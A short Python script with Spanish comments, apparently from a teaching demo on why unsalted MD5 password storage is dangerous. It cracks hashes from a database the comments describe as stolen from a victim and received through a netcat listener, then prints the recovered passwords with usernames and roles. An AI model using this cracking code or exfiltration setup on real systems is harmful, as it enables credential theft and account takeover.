import sqlite3
import hashlib

# Aquí abrimos la base de datos que le robamos a la víctima (la recibimos con
# el listener: nc -lvnp 5555 > portal.db).
con = sqlite3.connect("portal.db")
filas = con.execute("SELECT usuario, password, rol FROM usuarios").fetchall()

# Probamos una lista de contraseñas comunes: convertimos cada una con MD5 y la
# comparamos con las guardadas. Como la app usa MD5 sin sal, esto es rapidísimo,
# y por eso robar la base de datos es tan grave. En la demo se puede usar una
# lista grande (rockyou.txt); aquí va una corta.
diccionario = ["operador123", "SuperAdmin2026!", "admin", "123456",
               "password", "qwerty", "portal2026"]
tabla = {hashlib.md5(p.encode()).hexdigest(): p for p in diccionario}

print("usuario | rol | hash MD5 | contraseña recuperada")
for usuario, h, rol in filas:
    print(f"{usuario} | {rol} | {h} | {tabla.get(h, '[no crackeado]')}")
